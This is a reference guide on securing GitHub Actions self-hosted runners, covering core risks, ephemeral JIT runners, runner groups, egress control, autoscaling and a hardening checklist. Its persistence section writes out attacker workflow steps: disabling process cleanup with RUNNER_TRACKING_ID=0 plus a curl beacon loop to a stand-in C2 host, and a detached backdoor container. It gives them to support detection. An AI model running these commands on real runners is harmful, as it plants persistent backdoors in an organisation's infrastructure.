# Runner Security Reference

Self-hosted runner threats, ephemeral patterns, autoscaling, network
hardening, and persistence detection.

---

## Table of Contents

- [Why Self-Hosted Runners Are Dangerous](#why-self-hosted-runners-are-dangerous)
- [Persistence Techniques](#persistence-techniques)
- [Ephemeral Runner Patterns](#ephemeral-runner-patterns)
- [Runner Groups and Isolation](#runner-groups-and-isolation)
- [Network Hardening](#network-hardening)
- [Autoscaling Approaches](#autoscaling-approaches)
- [Hardening Checklist](#hardening-checklist)

---

## Why Self-Hosted Runners Are Dangerous

### Core Risks

| Risk | Description |
|------|-------------|
| **Non-ephemeral by default** | State, credentials, and files persist between jobs |
| **Internal network access** | Runners bypass external firewalls; connected to org infrastructure |
| **Arbitrary code execution** | Any user who can open a PR may trigger workflow execution |
| **Shared runner compromise** | Org/enterprise runners can schedule jobs from multiple repos |
| **Secret visibility** | `ps x -w` can reveal secrets passed as command-line arguments |
| **Elevated privileges** | Runner process often runs with elevated host permissions |

### Attack Scenarios

1. **Fork PR → internal network access:** Attacker opens PR to public repo using
   self-hosted runner → workflow executes attacker code on internal infrastructure

2. **Secret theft across jobs:** Shared runner serves multiple repos → compromised
   job steals GITHUB_TOKEN or secrets from concurrent/subsequent jobs

3. **Persistent backdoor:** Attacker establishes foothold during one job that
   survives job completion (see Persistence Techniques)

4. **Lateral movement:** From compromised runner → pivot to databases, APIs,
   internal services on the same network

### Real-World Demonstrations

- **Praetorian (TensorFlow):** Supply chain compromise via self-hosted runner
  attack on TensorFlow
- **Sysdig:** Documented how threat actors use runners as backdoors to org
  infrastructure
- **Praetorian (gato tool):** Automates detection of non-ephemeral self-hosted
  runners by analyzing workflow run logs

---

## Persistence Techniques

### RUNNER_TRACKING_ID Bypass

Setting `export RUNNER_TRACKING_ID=0` prevents the runner from terminating
child processes when the job completes. A spawned reverse shell, daemon, or
script becomes an orphan process.

```bash
# Attacker code in a workflow step:
export RUNNER_TRACKING_ID=0
nohup bash -c 'while true; do curl https://c2.attacker.com/beacon; sleep 60; done' &
```

### Detached Docker Containers

Launching a container in detached mode prevents the runner from hanging
and leaves the container running indefinitely:

```bash
docker run -d --restart=always attacker/backdoor:latest
```

### Tool Cache Manipulation

Runners cache installed tools (Go, Node, Python) in `$RUNNER_TOOL_CACHE`.
Replacing a cached binary with a trojanized version affects all future jobs
that use that tool version.

### Detection

Monitor for:
- Unexpected child processes after job completion
- Detached Docker containers not created by workflow steps
- `RUNNER_TRACKING_ID` manipulation in workflow logs
- Modified files in `$RUNNER_TOOL_CACHE`

---

## Ephemeral Runner Patterns

### Just-In-Time (JIT) Registration

```bash
# Register as ephemeral (auto-deregisters after one job)
./config.sh --url https://github.com/octo-org \
  --token <TOKEN> \
  --ephemeral

# Disable auto-updates (for container-based)
./config.sh --url https://github.com/octo-org \
  --token <TOKEN> \
  --ephemeral \
  --disableupdate
```

- GitHub assigns only ONE job per ephemeral runner → guarantees clean environment
- Runner self-removes after job completion
- If auto-updates disabled: must update within 30 days of new runner release

### REST API JIT Runners

For dynamic provisioning, use the REST API to create JIT runners:

```
POST /repos/{owner}/{repo}/actions/runners/generate-jitconfig
```

Returns a one-time-use runner configuration that auto-deregisters after
completing a single job.

### Container-Based Ephemeral Pattern

1. Spin up container from clean image
2. Configure runner with `--ephemeral --disableupdate`
3. Runner picks up one job, executes it
4. Container terminates and is destroyed
5. No state persists between jobs

Forward logs to external storage before container termination.

---

## Runner Groups and Isolation

### Access Control Levels

1. **Enterprise → organizations:** Which orgs can access an enterprise runner group
2. **Organization → repositories:** Which repos can access an org runner group
3. **Organization → workflows:** Which specific workflows can use a runner group

### Isolation by Trust Level

| Trust Level | Runner Group | Repos Allowed |
|-------------|-------------|---------------|
| High (production) | `prod-runners` | Release repos only |
| Medium (internal) | `internal-runners` | Private repos only |
| Low (untrusted) | `public-runners` | Never — use GitHub-hosted |

**Critical rule:** Public repos must NEVER share runners with private/internal repos.

### Label-Based Routing

```yaml
# By labels (runner must match ALL)
runs-on: [self-hosted, linux, ARM64]

# By group
runs-on:
  group: prod-runners

# By group + label
runs-on:
  group: internal-runners
  labels: [gpu]
```

Labels are cumulative — `[self-hosted, linux, gpu]` requires all three.

---

## Network Hardening

### Egress Control

- Configure network-level allowlists for outbound connections
- Block all traffic except known-good destinations
- Monitor for anomalous outbound connections (exfiltration indicators)

### Required Outbound Domains (github.com)

```
github.com
*.github.com
*.githubusercontent.com
ghcr.io
```

Min bandwidth: 70 kbps upload/download. Port 443 HTTPS only.
No inbound connections required from GitHub to runner.

### Runtime Monitoring

StepSecurity Harden-Runner provides:
- eBPF-based network egress monitoring per step/job
- Domain allowlisting with `audit` or `block` mode
- File integrity monitoring
- Process execution tracking

---

## Autoscaling Approaches

### Actions Runner Controller (ARC) — Kubernetes

Recommended for Kubernetes environments:
- Reference implementation of GitHub's scale set APIs
- Full lifecycle: provisioning → job execution → cleanup
- Requires Kubernetes infrastructure

### Scale Set Client — Non-Kubernetes

Standalone Go module (`github.com/actions/scaleset`):
- Interfaces with same scale set APIs as ARC
- You provide the infrastructure (VMs, containers, cloud)

### Webhook-Based (Custom)

Use `workflow_job` webhook (`queued`, `in_progress`, `completed`):
- Available at repo, org, enterprise level
- Higher latency than scale set APIs
- Not ideal for high volume

### Runner Software Updates

If auto-updates disabled: track `actions/runner` releases and update
within 30 days. After 30 days, GitHub will not assign jobs to outdated
runners.

---

## Hardening Checklist

### Never Do

- [ ] Never use self-hosted runners on public repositories
- [ ] Never share runners between public and private repos
- [ ] Never run the runner process as root
- [ ] Never leave runners in non-ephemeral mode for sensitive workloads
- [ ] Never allow unrestricted network egress from runners

### Always Do

- [ ] Use ephemeral (JIT) runners destroyed after each job
- [ ] Isolate runners by trust level using runner groups
- [ ] Run the runner process as a low-privileged user
- [ ] Require workflow approval for first-time/external contributors
- [ ] Monitor processes, log activity, inspect for persistence indicators
- [ ] Restrict network egress to known-good destinations
- [ ] Recycle runners routinely; audit runner inventory
- [ ] Forward logs to external storage before destroying ephemeral runners
- [ ] Use ARC or Scale Set APIs for autoscaling (prefer over webhook-based)
- [ ] Disable runners for repos that don't need them
